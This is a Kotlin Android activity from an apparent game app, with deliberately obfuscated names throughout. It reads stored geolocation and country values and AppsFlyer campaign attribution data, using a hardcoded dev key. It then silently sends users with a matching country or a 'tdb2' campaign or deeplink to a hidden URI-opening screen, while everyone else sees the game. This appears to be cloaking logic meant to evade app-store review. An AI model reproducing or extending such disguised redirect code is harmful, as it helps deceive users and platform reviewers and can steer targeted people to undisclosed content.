package com.superking.parchi.aaaaaactiv

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.material.snackbar.Snackbar
import com.orhanobut.hawk.Hawk
import com.superking.parchi.databinding.ActivityFiiliTvoooBinding
import com.superking.parchi.ooooootger.AppleClasa.Companion.checkfrr
import com.superking.parchi.ooooootger.AppleClasa.Companion.gthygeomeo
import com.superking.parchi.ooooootger.AppleClasa.Companion.c1gttg
import com.superking.parchi.ooooootger.AppleClasa.Companion.hnnhnhnhhn
import com.superking.parchi.ooooootger.AppleClasa.Companion.hyyDEEPLfrfr
import com.superking.parchi.ooootheer2.FiiikiClasssasssssssss
import com.superking.parchi.ooootheer2.Meeeeeeeeeeeeeeee
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class FiiliTvoooActivity : AppCompatActivity() {

    val testyyy = "rrrrrrrrrr"
    lateinit var gbgnhnh: ActivityFiiliTvoooBinding

    private fun juujjuujuj() {
        val bgnhhjuy = Intent(this@FiiliTvoooActivity, GaamarattooActivity::class.java)
        Hawk.put(gthygeomeo, null)
        Hawk.put(hnnhnhnhhn, null)
        Hawk.put(checkfrr, null)
        startActivity(bgnhhjuy)
        finish()
    }

    private fun gtggtgttg() {
        val gtgtgtt = Intent(this@FiiliTvoooActivity, OpennUriActivity::class.java)
        Hawk.put(gthygeomeo, null)
        Hawk.put(hnnhnhnhhn, null)
        Hawk.put(checkfrr, null)
        startActivity(gtgtgtt)
        finish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        gbgnhnh = ActivityFiiliTvoooBinding.inflate(layoutInflater)
        setContentView(gbgnhnh.root)

        val gtgtappsChfrffrrf: String? = Hawk.get(checkfrr, "null")

        if (testyyy == "fiifififi"){
            val meeeeeeeeeeeeeeee = Meeeeeeeeeeeeeeee(this)
            Snackbar.make(
                gbgnhnh.root, "Loading...${meeeeeeeeeeeeeeee.displayMessage(5)}",
                Snackbar.LENGTH_LONG
            ).show()

            FiiikiClasssasssssssss(ccooooontext = this).also {
                it.prrrrrrint()
            }
        }

        if (gtgtappsChfrffrrf == "1") {
            AppsFlyerLib.getInstance()
                .init("RLabPU7UfbMHppwGCzJ8sT", gtggtfrfrfrpl, applicationContext)
            AppsFlyerLib.getInstance().start(this)
        }

        gtgtgt()

    }


    private fun gtgtgt() {

        val gtgtgtgt: String = Hawk.get(gthygeomeo)
        Log.d("lolo", "geo is ${gtgtgtgt}")
        val countyCfrfrrfrf: String = Hawk.get(hnnhnhnhhn, "null")
        Log.d("lolo", "countyCfrfrrfrf is ${countyCfrfrrfrf}")

        Log.d("lolo", "geo is ${gtgtgtgt}")

        val deeplinkgtgttg: String? = Hawk.get(hyyDEEPLfrfr, "null")
        val appsChfrfgtg: String? = Hawk.get(checkfrr, "null")
        var gttgnamingfrfrrr: String? = Hawk.get(c1gttg)

        if (appsChfrfgtg == "1") {
            val gtgtgttg = Executors.newSingleThreadScheduledExecutor()
            gtgtgttg.scheduleAtFixedRate({
                if (gttgnamingfrfrrr != null) {

                    if (gttgnamingfrfrrr!!.contains("tdb2") || gtgtgtgt.contains(countyCfrfrrfrf) || deeplinkgtgttg!!.contains("tdb2")) {
                        gtgtgttg.shutdown()
                        gtggtgttg()
                    } else {
                        gtgtgttg.shutdown()
                        juujjuujuj()
                    }
                } else {
                    gttgnamingfrfrrr = Hawk.get(c1gttg)
                }
            }, 0, 1, TimeUnit.SECONDS)
        }  else if (gtgtgtgt.contains(countyCfrfrrfrf)) {
            gtggtgttg()
        } else {
            juujjuujuj()
        }

    }


    private val gtggtfrfrfrpl = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val gttggtgt = data?.get("campaign").toString()
            Hawk.put(c1gttg, gttggtgt)
        }
        override fun onConversionDataFail(p0: String?) {}
        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }



}